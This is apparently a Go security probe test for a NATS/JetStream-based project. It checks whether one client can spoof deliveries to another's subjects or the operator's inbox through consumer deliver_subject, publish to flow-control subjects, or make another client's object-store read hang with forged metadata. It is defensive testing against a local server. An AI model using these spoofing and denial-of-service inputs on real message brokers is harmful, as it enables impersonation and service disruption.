package zzprobe

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/nats-io/nats-server/v2/server"
	"github.com/nats-io/nats.go"
	"github.com/nats-io/nats.go/jetstream"
	"github.com/nats-io/nkeys"

	"github.com/pt9912/hetzner-viper/internal/natsmcp"
	"github.com/pt9912/hetzner-viper/internal/natsserver"
)

type env struct {
	srv  *server.Server
	seed map[string]string
}

func setup(t *testing.T) *env {
	dir := t.TempDir()
	o := &env{seed: map[string]string{}}
	var clients []natsserver.Client
	for _, name := range []string{"a", "b", "operator", natsserver.AdminName} {
		id, _ := natsserver.NewIdentity()
		clients = append(clients, natsserver.Client{Machine: name, PublicKey: id.PublicKey, Operator: name == "operator", Admin: name == natsserver.AdminName})
		o.seed[name] = id.Seed
	}
	block, err := natsserver.AuthorizationBlock("g", clients, true)
	if err != nil {
		t.Fatal(err)
	}
	conf := filepath.Join(dir, "s.conf")
	os.WriteFile(conf, []byte("host: \"127.0.0.1\"\nport: -1\njetstream {\n store_dir: \""+filepath.Join(dir, "js")+"\"\n}\n\n"+block), 0o600)
	opts, _ := server.ProcessConfigFile(conf)
	o.srv, _ = server.NewServer(opts)
	go o.srv.Start()
	if !o.srv.ReadyForConnections(5 * time.Second) {
		t.Fatal("nr")
	}
	t.Cleanup(o.srv.Shutdown)
	return o
}
func (o *env) conn(t *testing.T, n string) *nats.Conn {
	kp, _ := nkeys.FromSeed(bytes.TrimSpace([]byte(o.seed[n])))
	pub, _ := kp.PublicKey()
	nc, err := nats.Connect(o.srv.ClientURL(), nats.Nkey(pub, kp.Sign), nats.NoEcho(), nats.CustomInboxPrefix("_INBOX."+n))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(nc.Close)
	return nc
}

func TestProbe(t *testing.T) {
	o := setup(t)
	ctx, c := context.WithTimeout(context.Background(), 8*time.Second)
	defer c()
	if _, _, err := natsmcp.EnsureBucket(ctx, o.conn(t, "admin"[:0]+natsserver.AdminName), natsmcp.BucketSpec{Group: "g", MaxBytes: 64 << 20, TTL: time.Hour}); err != nil {
		t.Fatal(err)
	}
	a, b, op := o.conn(t, "a"), o.conn(t, "b"), o.conn(t, "operator")
	jsa, _ := jetstream.New(a)
	oba, err := jsa.ObjectStore(ctx, "viper-g")
	if err != nil {
		t.Fatal(err)
	}
	// a puts chunk data that looks like an envelope
	if _, err := oba.PutBytes(ctx, "x", []byte(`{"spoof":"yes"}`)); err != nil {
		t.Fatal(err)
	}
	// 1. spoof via deliver_subject
	got := make(chan *nats.Msg, 5)
	op.Subscribe("viper.g.>", func(m *nats.Msg) { got <- m })
	op.Flush()
	_ = b
	req := `{"stream_name":"OBJ_viper-g","config":{"deliver_subject":"viper.g.b.out.victim","deliver_policy":"all","ack_policy":"none","filter_subject":"$O.viper-g.C.>"}}`
	r, err := a.Request("$JS.API.CONSUMER.CREATE.OBJ_viper-g", []byte(req), 3*time.Second)
	fmt.Println("create consumer:", err)
	if r != nil {
		fmt.Println(string(r.Data))
	}
	time.Sleep(500*time.Millisecond)
	ri, err := a.Request("$JS.API.CONSUMER.INFO.OBJ_viper-g.0rFJuv77", nil, time.Second)
	fmt.Println("info:", err)
	if ri != nil { fmt.Println(string(ri.Data)) }
	op.Subscribe("_INBOX.operator.>", func(m *nats.Msg) { got <- m })
	op.Flush()
	req2 := `{"stream_name":"OBJ_viper-g","config":{"deliver_subject":"_INBOX.operator.zz","deliver_policy":"all","ack_policy":"none","filter_subject":"$O.viper-g.C.>"}}`
	r2, err := a.Request("$JS.API.CONSUMER.CREATE.OBJ_viper-g", []byte(req2), 3*time.Second)
	fmt.Println("create2:", err, r2 != nil)
	sa, _ := a.SubscribeSync("_INBOX.a.own")
	a.Flush()
	req3 := `{"stream_name":"OBJ_viper-g","config":{"deliver_subject":"_INBOX.a.own","deliver_policy":"all","ack_policy":"none","filter_subject":"$O.viper-g.C.>"}}`
	r3, err := a.Request("$JS.API.CONSUMER.CREATE.OBJ_viper-g", []byte(req3), 3*time.Second)
	fmt.Println("create3:", err, string(r3.Data)[:80])
	m3, err := sa.NextMsg(2 * time.Second)
	fmt.Println("own delivery:", m3 != nil, err)
	select {
	case m := <-got:
		fmt.Printf("SPOOF delivered on %s: %q\n", m.Subject, m.Data)
	case <-time.After(2 * time.Second):
		fmt.Println("no spoof delivery")
	}
	// 2. FC publish
	err = a.Publish("$JS.FC.OBJ_viper-g.foo.bar", []byte("x"))
	fmt.Println("fc pub err:", err, a.Flush())
	err = a.Publish("$JS.FC.OBJ_viper-g.>", []byte("x"))
	fmt.Println("fc wildcard pub err:", err)
	a.Flush()
	// 3. hang: meta with size>0 and no chunks
	meta := `{"name":"hang","bucket":"viper-g","nuid":"ZZZZZZZZZZZZZZZZZZZZZZ","size":10,"chunks":1,"digest":"SHA-256=AAAA","mtime":"2026-01-01T00:00:00Z"}`
	if err := a.Publish("$O.viper-g.M."+base64.URLEncoding.EncodeToString([]byte("hang")), []byte(meta)); err != nil {
		t.Fatal(err)
	}
	a.Flush()
	time.Sleep(300 * time.Millisecond)
	jsb, _ := jetstream.New(b)
	obb, _ := jsb.ObjectStore(ctx, "viper-g")
	done := make(chan string, 1)
	go func() {
		cx, cc := context.WithTimeout(context.Background(), 3*time.Second)
		defer cc()
		r, err := obb.Get(cx, "hang")
		if err != nil {
			done <- "get err " + err.Error()
			return
		}
		d, err := io.ReadAll(r)
		done <- fmt.Sprintf("read %d %v", len(d), err)
	}()
	select {
	case s := <-done:
		fmt.Println("hang probe returned:", s)
	case <-time.After(8 * time.Second):
		fmt.Println("HANG: ReadAll did not return after ctx 3s timeout")
	}
}
